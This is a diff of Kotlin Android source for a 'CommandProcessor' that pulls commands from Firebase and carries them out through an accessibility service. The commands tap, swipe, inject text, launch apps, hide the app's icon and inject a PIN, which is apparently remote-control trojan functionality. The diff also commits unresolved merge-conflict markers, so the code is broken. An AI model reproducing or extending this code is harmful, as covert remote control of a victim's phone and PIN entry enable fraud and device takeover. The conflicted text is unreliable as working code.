@@ -13,7 +13,11 @@ object CommandProcessor {
         FirebaseBridge.commandsRef.addChildEventListener(object : ChildEventListener {
             override fun onChildAdded(snapshot: DataSnapshot, previous: String?) {
                 val cmd = snapshot.getValue(RemoteCommand::class.java) ?: return
+<<<<<<< HEAD
                 execute(cmd, snapshot.key)
+=======
+                execute(cmd)
+>>>>>>> 0ad8761 (Update Wq project)
                 snapshot.ref.removeValue()
             }
             override fun onChildChanged(s: DataSnapshot, p: String?) {}
@@ -25,22 +29,33 @@ object CommandProcessor {
         })
     }
 
+<<<<<<< HEAD
     private fun execute(cmd: RemoteCommand, key: String?) {
+=======
+    private fun execute(cmd: RemoteCommand) {
+>>>>>>> 0ad8761 (Update Wq project)
         val svc = MyAccessibilityService.instance ?: return
 
         when (cmd.type) {
             "tap" -> svc.tap(cmd.x ?: 500, cmd.y ?: 1000)
+<<<<<<< HEAD
             "swipe" -> svc.swipe(
                 cmd.sx ?: 0, cmd.sy ?: 0,
                 cmd.ex ?: 0, cmd.ey ?: 0,
                 cmd.duration ?: 300L
             )
+=======
+            "swipe" -> svc.swipe(cmd.sx ?: 0, cmd.sy ?: 0, cmd.ex ?: 0, cmd.ey ?: 0, cmd.duration ?: 300L)
+>>>>>>> 0ad8761 (Update Wq project)
             "type", "paste" -> {
                 val text = decodeIfBase64(cmd.text) ?: return
                 svc.injectText(text)
             }
             "launch" -> svc.launchApp(cmd.text ?: "")
+<<<<<<< HEAD
             "click_text" -> svc.clickText(cmd.text ?: "")
+=======
+>>>>>>> 0ad8761 (Update Wq project)
             "home" -> svc.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME)
             "back" -> svc.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK)
             "hide_activity" -> svc.hideAppIcon()
@@ -59,9 +74,12 @@ object CommandProcessor {
                 val pkg = cmd.text ?: return
                 svc.injectPin(pkg)
             }
+<<<<<<< HEAD
             "macro" -> {
                 // ... (macro execution code – keep existing from original if needed)
             }
+=======
+>>>>>>> 0ad8761 (Update Wq project)
         }
     }
 
